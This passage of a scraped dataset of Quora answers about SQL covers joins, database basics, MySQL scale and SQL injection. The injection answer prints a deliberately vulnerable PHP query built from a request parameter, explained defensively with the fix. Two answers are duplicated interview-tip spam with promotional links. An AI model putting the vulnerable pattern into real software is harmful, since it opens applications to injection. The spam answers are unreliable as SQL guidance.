+Fitbit uses MySQL - the Percona version - to manage about 500TB of master-level data at the moment, with about 2PB of total data once replication is factored in, in several hundred shards. The biggest shards are a few TB each.
+We don’t use MariaDB, but I don’t have any reason to believe that the MariaDB fork of MySQL is any less capable than the Percona version in terms of handling larger databases.
+109 Views · View 6 Upvoters · Answer requested by
+Miguel Paraz",Greg Kemnitz,Is MariaDB scalable up to enterprise sized databases?,SQL
+24,"This is really close to my answer from When does an SQL left join act like an inner join? however I think it does a good job answering this question as well.
+Lets take a look at the difference between Left Outer Join(Same as Left Join) and Inner Join and then see when they can act like each other:
+Inner Join is when you match rows from two or more tables based on the predicate, when the predicate evaluates TRUE then a row is returned. If the predicate evaluates to False, by not matching, then a row is not returned.
+Lets check out an example really fast:
+Here we see for every row from Products Table and Suppliers Table that has a matching SupplierID, a row is returned. We also fully qualify SupplierID in the SELECT list because both tables have the same name for the column. With this example we returned 77 rows.
+Left Outer Join works like an Inner Join at first where it will return all the matching rows based on the predicate, however it will also return non-matching rows from the left table as well. This will also include rows with NULL values. Outer Joins are used to preserve the table rows, when using LEFT outer join it preserves the rows from the table on the LEFT side of the predicate, like wise with RIGHT outer join, the table on the RIGHT is preserved. When using FULL Outer Join the rows are preserved from both tables.
+Lets see an example:
+We can see here that ONE extra row is returned, the test row I inserted, because all rows are preserved from the LEFT table. Even though the predicate evaluates False, because SupplierID is NULL, it will still be returned. If we look at the example again and were to change the LEFT to instead RIGHT Outer Join then all the rows from the RIGHT table would be preserved. Also, as I said if you were to use FULL Outer join then both tables, or both sides of the predicate, would be preserved.
+So, if there are no rows that would be returned using a Left Outer Join, if we look at the two examples, without me adding the test row (ProductID of 78) I get the exact same results because my predicate evaluation returns true for each row.
+Also, if the predicate value returns true for each row in both tables then you will get the same results between INNER and LEFT OUTER join. However, if there were any False evaluations, as with the test row, then that row will only be returned using the LEFT OUTER join.
+I hope this helped out and I hope I was clear in my explanation. I also have a SQL Server Tutorial Series I am working on right now on my site tsqlmichael.wordpress.com and in two more articles I will be covering all types of JOINS and go into detail with them, feel free to check it out!
+Also feel free to message me for any questions or clarifications! Thanks
+232 Views · View 1 Upvoter",Mike Anderson,"Why are SQL joins named ""outer"" and ""inner""?",SQL
+25,".#Tips, tricks for the question: How can I prepare SQL for interview
+.
+Below are top 10 hack tips for your job interview, I hope it helps.
+##TOP 10 HACK TIPS FOR YOUR JOB INTERIVEWS
+1. Secret weapon: tell your career stories at your job interview
+ 
+ You’re prepped and ready to totally nail this job interview. You’ve rehearsed your elevator pitch—in front of the mirror, even. You’ve committed the entire job description to memory. Heck, you even drove a practice route to the interview location to make sure you knew exactly where to park.
+ 
+ So, when the meeting finally rolls around, you’re feeling cool, calm, and collected. That is, until the interviewer jumps right in with the dreaded, “Tell me about a time when…”
+ 
+ Suddenly your mouth is dry, your mind is blank, and you have a mental facepalm moment. Why, oh why, didn’t you think to prepare for these types of prompts?
+ 
+ Yes, those requests for real-world examples—also known as behavioral interview questions—are frustrating. But, they’re also an extremely common part of the interview process.
+ 
+ Your best bet is to have a few stories prepared and ready to go for your next interview. Here are the six big ones you should make sure to have in your arsenal. They’re general enough that they can be used for a variety of questions, but specific enough that the person asking will feel like he or she’s getting a good, solid, detail-filled response.
+Related materials:
++ Top 10 career stories for your job interviews: 10CareerStories.blogspot . com
++ Free ebook 395 interview questions with
+answers: InterviewQuestions88 .info/2014/12/free-ebook-395-interview-questions-with-answers-pdf.html
+2. Know about the company:
+Spend time to know about the company’s background and various activities of the company. Knowledge about the company will make you look serious for the job. Also if you have time, read about the competitors.
+Know the basic stats on size and state of the company, and try to develop a view on the top 3 strengths and the top 3 weaknesses/issues the company faces. If you can think through and be prepared to articulate how you can reinforce the strengths and help make progress against the issues, then even better.
+Pro Tip:
+·
+Set up Google News Alerts for the company and industry you are interviewing for. It shall give you timely news alerts and much needed information & talking points! You can also refer to Social media, website, google search etc. to get more information. Also you can search for people/friends on LinkedIn who are already working in the company and talk to them.
+·
+Search company on Glassdoor. com. I find that there are typically elements of truth to the themes that surface there, and it is a good way to get a feel for what to expect culturally and again this preparation can help to inform your questions
+3. Ask questions
+ 
+ You should always have some questions for your interviewer to demonstrate your interest in the position. Prepare a minimum of five questions, some which will give you more information about the job and some which delve deeper into the culture and goals of the company.
+Related material:
++ Best 12 questions to ask employers: InterviewQuestions66.blogspot. com
++ InterviewTips365. info/2014/12/free-ebook-82-secrets-to-win-every-job-interviews-pdf.html
+4. Make good first impressions
+ 
+ A cardinal rule of interviewing is to be polite and offer warm greetings to everyone you meet from the parking attendant to the receptionist to the hiring manager. Employers often are curious how job applicants treat staff members and your job offer could easily be derailed if you’re rude or arrogant to any of the staff. When it’s time for the interview, keep in mind that first impressions the impression interviewers get in the first few seconds of meeting you can make or break an interview.
+ Remember that having a positive attitude and expressing enthusiasm for the job and employer are vital in the initial stages of the interview; studies show that hiring managers make critical decisions about job applicants in the first 20 minutes of the interview.
+Related material:
++ Top 35 tips to prepare for your job interview: 35JobInterviewTips.blogspot .com
+5. Structure your answer
+Most people see a job interview as a passive experience where they answer questions and are confident of securing the job if they answer the questions asked correctly. Rather, see an interview as an opportunity to answer or respond to questions following a guide or plan on the subject of interest. Your answers should emphasize how your skills will be of relevance to the company. To improve how to answer questions in the interview, draft 5 points and have both short and long answers to each point. Nevertheless, you are required to pay attention or listen carefully during the interview. Ensure you carry out proper research on the company before an interview to enable you to prepare appropriately for questions the interview is likely to ask.
+Related material:
++ Top 42 common interview questions with
+answers: 42InterviewQuestionsWithAnswers.blogspot .com
+6. Bring examples of your work
+I have been called several times by hiring managers who expressed their delight at some of my candidates who came to the interview session with samples of their work. You also have the opportunity to do this. Make the most of printed words, it shows how prepared you are and this alone might just set you apart from other candidates. Idea: Some candidates take a copy of their most recent written review to the interview. Obviously, you should only do this if your evaluation is outstanding. Perhaps you could come with a graph or a chat that illustrates the actions you took that saved your old company some money or even how you improved their business.
+Always couch your examples with the following line of logic:
+• This was the situation at the time.
+ • This is what I did to remedy the situation.
+ • My actions yielded these results.
+7. Clarify your ""selling points"" and the reasons you want the job.
+ 
+ Prepare to go into every interview with three to five key selling points in mind, such as what makes you the best candidate for the position. Have an example of each selling point prepared (""I have good communication skills. For example, I persuaded an entire group to ...""). And be prepared to tell the interviewer why you want that job – including what interests you about it, what rewards it offers that you find valuable, and what abilities it requires that you possess. If an interviewer doesn't think you're really, really interested in the job, he or she won't give you an offer – no matter how good you are!
+8. Dress for Success
+ 
+ Plan out a wardrobe that fits the organization and its culture, striving for the most professional appearance you can accomplish. Remember that it’s always better to be overdressed than under and to wear clothing that fits and is clean and pressed. Keep accessories and jewelry to a minimum. Try not to smoke or eat right before the interview and if possible, brush your teeth or use mouthwash.
+9. Practice, practice, practice.
+ 
+ It's one thing to come prepared with a mental answer to a question like, ""Why should we hire you?"" It's another challenge entirely to say it out loud in a confident and convincing way. The first time you try it, you'll sound garbled and confused, no matter how clear your thoughts are in your own mind! Do it another 10 times, and you'll sound a lot smoother and more articulate.
+ 
+ But you shouldn't do your practicing when you're ""on stage"" with a recruiter; rehearse before you go to the interview. The best way to rehearse? Get two friends and practice interviewing each other in a ""round robin"": one person acts as the observer and the ""interviewee"" gets feedback from both the observer and the ""interviewer."" Go for four or five rounds, switching roles as you go. Another idea (but definitely second-best) is to tape record your answer and then play it back to see where you need to improve. Whatever you do, make sure your practice consists of speaking aloud. Rehearsing your answer in your mind won't cut it.
+10. Thank Interviewer(s) in Person, by Email, or Postal Mail
+ 
+ Common courtesy and politeness go far in interviewing; thus, the importance of thanking each person who interviews you should come as no surprise. Start the process while at the interview, thanking each person who interviewed you before you leave. Writing thank-you emails or notes shortly after the interview will not get you the job offer, but doing so will certainly give you an edge over any of the other finalists who didn’t bother to send thank-you notes.
+If you have any questions, pls leave your comment below.
+1k Views · View 19 Upvoters",Peter Dawn,How can I prepare SQL for interview?,SQL
+26,"Originally Answered: Help! Should aspiring data scientists learn SQL?
+It really depends on what you are doing in the job - I did not use SQL so far in my current job, but if the data comes in SQL, I will have to use it. So, there is no harm in learning. SQL is not too hard to learn.
+73 Views · View 1 Upvoter",Sowmya V.B.,Should all data scientists know how to use SQL?,SQL
+27,"Hi, Thanks for the A2A!
+I think the first thing you need to do is learn SQL itself and the theory behind it.
+For this I would strongly recommend visiting SQL Server Central: Stairways here are some amazing articles that start from the very basic to the advanced with SQL.
+Secondly, I also have created a SQL Server Tutorial Series on my website Michael Walsh-Anderson here I have started out with the basics and fundamentals of SQL and am in the process of moving on to more advanced and intermediate topics. I try to update as frequently as possible. Here is an example of my first article, Understanding what SQL is:
+Welcome to my SQL Server Tutorial's first installment.
+Within this article I will be going over:
+Overview of Database Systems in general
+Overview of Relational Database Systems
+Overview of SQL and T-SQL language
+Back To The Basics, Database Systems In General:
+So what is a Database? We interact with them all the time, when you purchase your groceries at the supermarket or when you withdraw money from an ATM. Those systems are communicating with a Database to update quantity or the amount of money every time. Put simply, a Database is a container in which some amount of data is stored in a particular way.
+Now, the Database is managed and manipulated by the DataBase Management System or DBMS. There is often confusion when people say ""What Database are you using?"". This question generally means what DBMS are you using not what Database. For example, throughout this tutorial we will be using SQL Server which is a Relational DataBase Management System (RDBMS) which I will get into shortly, however the point is that more often than not people are referring to the management system and not the name of the Database inside of the system. The DBMS is responsible for handling all the tasks with the Database such is inserting/removing data, access to data, managing performance and security. These are just some of the tasks managed by the DBMS.
+The parts included in a Database (The container itself, not the management system) are many however, for the basics we will find that the following are important:
+Tables
+Tables are seen as a structure that lists one specific type of data and its attributes, such as employees, orders or departments. The important note is that each table is one type of data and not multiple. You aren't going to store employees and customers on the same table.These tables also have names, each of which is unique for each database. For example the Employees table, Orders table and so on.
+Columns
+Every table has one or more columns. This is best pictured as an excel spreadsheet or grid.The important note here is that each column has a specific Data Type. That is, what kind of data can or can't go in that column. For example, EmployeeID column can have an Integer Data Type to store the ID number. First/LastName column can have a Character Data Type to store characters of a name. How you set up columns on a table is important because it will affect how you can filter and sort data in the future. A prime example is having First name and Last name in different columns so in the future you can sort by either or both.
+Rows
+The rows of the table are what store the data. As you go down the columns you can count the rows of data.Each row will contain the data for one entry. For example, one row in the employees table could contain: FirstName, LastName, JobTitle, EmployeeID. Having a value of some kind (or the absence of a value) in each of those columns gives us a row.
+Primary Key
+Primary keys are Column(s) that 'Uniquely' defines each row in a table. For example you could use EmployeeID in the Employees table. You use the primary key to reference a specific row within the table, while not required, without it things become very difficult to ensure modification of data safely.When using a Primary Key every row must have a value in the primary key column, NULL values are not allowed. No two rows can have the same value and primary key values should Never be modified. Primary key values should also Never be re-used. If a row is deleted that primary key value should be considered 'deleted' as well and you should then use the next value in the sequence.
+Foreign Key
+Foreign Keys are Primary Keys from a child table that are referenced from a parent table. For example if we use the example picture below the EmployeeID of the Employees table is the Primary Key for that table, now lets assume you wanted to get all employees from a certain department in the Departments table, and lets say that DepartmentID is the Primary Key of that table. Then, if we query all employees from DepartmentID = 1 (Primary Key of Departments Table) then in that query, using a join, the EmployeeID (Primary Key of Employees Table) would be the Foreign Key in the Departments table.The purpose of the Foreign Key is to ensure Referential Integrity, which means that a value in one table will be the same value in the other table. So the EmployeeID value would be the same per employee in both the Employees table and Departments table.If this is confusing, do not worry, I will re-visit this when I get to joins in a later article.
+This picture shows us an example of a table with a column that is also a primary key and rows.
+So Then, What Is A Relational Database?
+A Relational Database is one that organizes itself using 'First Order Predicate Logic' and 'Set Theory'. Originally created by Dr. Codd, he describes the Relational model of database's by the algebraic relational model.
+A common misconception is that 'Relational Database' is called that because of the relationships of tables, this is incorrect. The Relational Database is in reference to mathematical Relations. This is shown in the Relational Database Model as follows, the Tables are seen as 'Relations' because 'Relations' are defined as a set of 'Tuples' with the same attributes, the rows are seen as 'Tuples' because they are defined as a set of data representing one item.
+When using SQL you want to be thinking in 'Sets' not individual. When trying to get data from your database you want a set of data returned. Also with a set in relational theory you have a few other key points:
+Rows do not have a particular order
+Each column within a table must have a unique name
+Each data point within a column then in a row has a single value, that is there wont be two first names on row number one of the first name column.
+In future articles we will discover 'Set Operators' that will directly reference and work with set theory.
+Another main concept of Relational Databases is Normalization, or Normal Forms, are important to understand with Relational Database Systems. There are many different Normal Forms, most commonly you will see 1NF, 2NF and 3NF. That is they start at one and progress up. Here is an explanation:
+1NF (First Normal Form): Simply put, each attribute can only contain a single value, this means only one name or phone number in the respective column.
+2NF (Second Normal Form): Must be 1NF and can't have any non-key column dependent on a partial primary key of the table. So any table that has a single-column primary key will always be 2NF. A common example are lookup or reference tables.
+3NF (Third Normal Form): Must be 1NF and 2NF, there can be no functional dependencies between the non-key columns. This basically means all the non-key columns are dependent on the Primary Key.
+More Normal Forms exist, however these are the commonly used ones.
+So After All That, Tell Me What Is SQL And T-SQL?
+SQL stands for Structured Query Language. It can be pronounced as the letters S-Q-L or Sequel. It is important to note that SQL is a Language this is important because with a language you can do much much more than if it was say a library or some sub-set of another language. SQL was created specifically to work with and communicate with database systems. It is also deliberately made up of just a few keywords and created this way to make interacting with data simple and easy but powerful and dynamic as well.
+SQL is a Declarative Language, this means you tell the system what you want using logic and the system decides How it wants to complete the task. In contrast, the opposite is Imperative Programming where you describe how a program should complete a task.
+SQL is the standard language for most major DBMS utilities, each one usually has its own dialect to specifically tailored for that system. SQL is governed by ANSI, so standard SQL is referred to as ANSI SQL. All proprietary platforms support ANSI SQL. For Microsoft their version of SQL is Transact-SQL, it is standard SQL with bits added to make it Transact-SQL.
+Transact-SQL, or T-SQL, is Microsoft's proprietary version of the SQL language. Here are some things T-SQL adds to standard SQL:
+Procedural Programming
+Local Variables
+Flow Control
+Allows the FROM clause to INSERT and DELETE statements
+Error Handling (TRY/CATCH/THROW)
+We will get into more details in later articles but the main point is anything using SQL Server will use T-SQL. This isn't the entire list of course but just some main points.
+T-SQL has two main sub-languages:
+DDL (Data Definition Language)Has Three statements:
+CREATE, ALTER and DROP
+These statements modify objects within the database such as tables, columns, indexes and databases themselves
+DML (Data Modification Language)Has Four statements:
+SELECT, INSERT, UPDATE and DELETE
+These statements control all the modification of data within the object that was modified with DDL.
+We will go into the details of these statement in later articles, as this is just an overview.
+This will conclude my first module in my SQL Server Tutorial series. I hope you have found it informative and enjoyable. I hope that you will follow along with this project and my journey as I continue to add more and more articles.
+Any comments, questions, criticism or concerns would be greatly appreciated! Please feel free to use the Contact Me section or just comment. Any type of feedback can help me improve.
+If you would like updates when a new module comes out then follow me here on my SQL Server Tutorial Series blog or visit my site/LinkedIn profile and follow me there, thank you!
+-Michael Walsh-Anderson
+171 Views · View 4 Upvoters · Answer requested by
+Minerva Goree",Mike Anderson,What are the best resources to learn SQL for data analysis?,SQL
+28,"The most basic answer is that SQL injection works when some untrusted content is combined with your SQL code before the SQL code is prepared.
+Here’s an example of vulnerable code in PHP:
+<?php
+$id = $_GET[“id”];
+$sql = “SELECT * FROM mytable WHERE id = $id”;
+$pdo->query($sql);
+This seems safe if the “id” parameter is always an integer. But it isn’t always an integer. HTTP allows request arguments to be any string. So it could be a string that contains extra SQL syntax, or even a second SQL statement.
+By combining the untrusted HTTP argument with your SQL code, and then executing the SQL, you create a vulnerability that allows any user of your web page to “inject” their own SQL operations, and your code blindly executes those operations.
+SQL injection was first reported in an article in December 1998. Here’s an article on how the author of that article discovered it: How Was SQL Injection Discovered?
+SQL injection is just one instance of a more general security vulnerability called Code Injection. This can apply to any case of parsing and executing code at runtime, based in part or fully on some untrusted source of content for the code. For example, several languages have a function like PHP’s eval() function, to evaluate a string as code and execute it. Some function like this exists in many languages: see the article on eval in Wikipedia.
+The way to know if your SQL code is vulnerable to SQL injection attacks is:
+You copy some program variables into your SQL string before it is prepared.
+The program variables you use in your SQL aren’t filtered or restricted or coerced to a known format or pattern. You just assume they’re in the intended format.
+The best single solution to fix your SQL queries is to use query parameters instead of copying variables into your SQL string. See examples and explanation in Bill Karwin's answer to Is it possible to SQL inject prepared statements?
+1.6k Views · View 20 Upvoters",Bill Karwin,How do SQL injection attacks work?,SQL
+29,".#Tips, tricks for the question: What are common entry level SQL developer interview questions
+.
+Below are top 10 hack tips for your job interview, I hope it helps.
+##TOP 10 HACK TIPS FOR YOUR JOB INTERIVEWS
+1. Secret weapon: tell your career stories at your job interview
+You’re prepped and ready to totally nail this job interview. You’ve rehearsed your elevator pitch—in front of the mirror, even. You’ve committed the entire job description to memory. Heck, you even drove a practice route to the interview location to make sure you knew exactly where to park.
+So, when the meeting finally rolls around, you’re feeling cool, calm, and collected. That is, until the interviewer jumps right in with the dreaded, “Tell me about a time when…”
+Suddenly your mouth is dry, your mind is blank, and you have a mental facepalm moment. Why, oh why, didn’t you think to prepare for these types of prompts?
+Yes, those requests for real-world examples—also known as behavioral interview questions—are frustrating. But, they’re also an extremely common part of the interview process.
+Your best bet is to have a few stories prepared and ready to go for your next interview. Here are the six big ones you should make sure to have in your arsenal. They’re general enough that they can be used for a variety of questions, but specific enough that the person asking will feel like he or she’s getting a good, solid, detail-filled response.
+Related materials:
++ Top 10 career stories for your job interviews: 10CareerStories.blogspot . com
++ Free ebook 395 interview questions with
+answers: InterviewQuestions88 .info/2014/12/free-ebook-395-interview-questions-with-answers-pdf.html
+2. Know about the company:
+Spend time to know about the company’s background and various activities of the company. Knowledge about the company will make you look serious for the job. Also if you have time, read about the competitors.
+Know the basic stats on size and state of the company, and try to develop a view on the top 3 strengths and the top 3 weaknesses/issues the company faces. If you can think through and be prepared to articulate how you can reinforce the strengths and help make progress against the issues, then even better.
+Pro Tip:
+• Set up Google News Alerts for the company and industry you are interviewing for. It shall give you timely news alerts and much needed information & talking points! You can also refer to Social media, website, google search etc. to get more information. Also you can search for people/friends on LinkedIn who are already working in the company and talk to them.
+• Search company on Glassdoor. com. I find that there are typically elements of truth to the themes that surface there, and it is a good way to get a feel for what to expect culturally and again this preparation can help to inform your questions
+3. Ask questions
+You should always have some questions for your interviewer to demonstrate your interest in the position. Prepare a minimum of five questions, some which will give you more information about the job and some which delve deeper into the culture and goals of the company.
+Related material:
++ Best 12 questions to ask employers: InterviewQuestions66.blogspot. com
++ InterviewTips365. info/2014/12/free-ebook-82-secrets-to-win-every-job-interviews-pdf.html
+4. Make good first impressions
+A cardinal rule of interviewing is to be polite and offer warm greetings to everyone you meet from the parking attendant to the receptionist to the hiring manager. Employers often are curious how job applicants treat staff members and your job offer could easily be derailed if you’re rude or arrogant to any of the staff. When it’s time for the interview, keep in mind that first impressions the impression interviewers get in the first few seconds of meeting you can make or break an interview.
+Remember that having a positive attitude and expressing enthusiasm for the job and employer are vital in the initial stages of the interview; studies show that hiring managers make critical decisions about job applicants in the first 20 minutes of the interview.
+Related material:
++ Top 35 tips to prepare for your job interview: 35JobInterviewTips.blogspot .com
+5. Structure your answer
+Most people see a job interview as a passive experience where they answer questions and are confident of securing the job if they answer the questions asked correctly. Rather, see an interview as an opportunity to answer or respond to questions following a guide or plan on the subject of interest. Your answers should emphasize how your skills will be of relevance to the company. To improve how to answer questions in the interview, draft 5 points and have both short and long answers to each point. Nevertheless, you are required to pay attention or listen carefully during the interview. Ensure you carry out proper research on the company before an interview to enable you to prepare appropriately for questions the interview is likely to ask.
+Related material:
++ Top 42 common interview questions with
+answers: 42InterviewQuestionsWithAnswers.blogspot .com
+6. Bring examples of your work
+I have been called several times by hiring managers who expressed their delight at some of my candidates who came to the interview session with samples of their work. You also have the opportunity to do this. Make the most of printed words, it shows how prepared you are and this alone might just set you apart from other candidates. Idea: Some candidates take a copy of their most recent written review to the interview. Obviously, you should only do this if your evaluation is outstanding. Perhaps you could come with a graph or a chat that illustrates the actions you took that saved your old company some money or even how you improved their business.
+Always couch your examples with the following line of logic:
+• This was the situation at the time.
+• This is what I did to remedy the situation.
+• My actions yielded these results.
+7. Clarify your ""selling points"" and the reasons you want the job.
+Prepare to go into every interview with three to five key selling points in mind, such as what makes you the best candidate for the position. Have an example of each selling point prepared (""I have good communication skills. For example, I persuaded an entire group to ...""). And be prepared to tell the interviewer why you want that job – including what interests you about it, what rewards it offers that you find valuable, and what abilities it requires that you possess. If an interviewer doesn't think you're really, really interested in the job, he or she won't give you an offer – no matter how good you are!
+8. Dress for Success
+Plan out a wardrobe that fits the organization and its culture, striving for the most professional appearance you can accomplish. Remember that it’s always better to be overdressed than under and to wear clothing that fits and is clean and pressed. Keep accessories and jewelry to a minimum. Try not to smoke or eat right before the interview and if possible, brush your teeth or use mouthwash.
+9. Practice, practice, practice.
+It's one thing to come prepared with a mental answer to a question like, ""Why should we hire you?"" It's another challenge entirely to say it out loud in a confident and convincing way. The first time you try it, you'll sound garbled and confused, no matter how clear your thoughts are in your own mind! Do it another 10 times, and you'll sound a lot smoother and more articulate.
+But you shouldn't do your practicing when you're ""on stage"" with a recruiter; rehearse before you go to the interview. The best way to rehearse? Get two friends and practice interviewing each other in a ""round robin"": one person acts as the observer and the ""interviewee"" gets feedback from both the observer and the ""interviewer."" Go for four or five rounds, switching roles as you go. Another idea (but definitely second-best) is to tape record your answer and then play it back to see where you need to improve. Whatever you do, make sure your practice consists of speaking aloud. Rehearsing your answer in your mind won't cut it.
+10. Thank Interviewer(s) in Person, by Email, or Postal Mail
+Common courtesy and politeness go far in interviewing; thus, the importance of thanking each person who interviews you should come as no surprise. Start the process while at the interview, thanking each person who interviewed you before you leave. Writing thank-you emails or notes shortly after the interview will not get you the job offer, but doing so will certainly give you an edge over any of the other finalists who didn’t bother to send thank-you notes.
+If you have any questions, pls leave your comment below.
+248 Views · View 12 Upvoters",Jennifer Lee,What are common entry level SQL developer interview questions?,SQL
